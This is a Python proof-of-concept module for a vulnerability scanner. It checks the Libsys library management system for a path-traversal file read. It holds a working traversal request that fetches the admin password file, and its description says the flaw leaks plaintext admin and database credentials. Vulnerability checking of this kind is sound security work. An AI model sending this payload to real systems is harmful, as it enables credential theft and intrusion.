# coding: utf-8
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Libsys_0101' # 平台漏洞编号，留空
    name = '汇文Libsys图书馆管理系统 /zplug/ajax_asyn_link.old.php 任意文件读取' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
    汇文软件Libsys图书馆管理系统任意文件读取，可以直接获取管理员账号，密码明文、数据库密码明文、配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL ...
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源 http://www.wooyun.org/bugs/wooyun-2014-059850
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Libsys'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'efabc2f6-5ac1-440b-89b0-e6994ae0564b' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            url = self.target
            verify_url = ('%s/zplug/ajax_asyn_link.old.php?url='
                          '../admin/opacadminpwd.php') %url             
            req = requests.get(verify_url)
            if req.status_code == 200 and '$strPassWdView' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()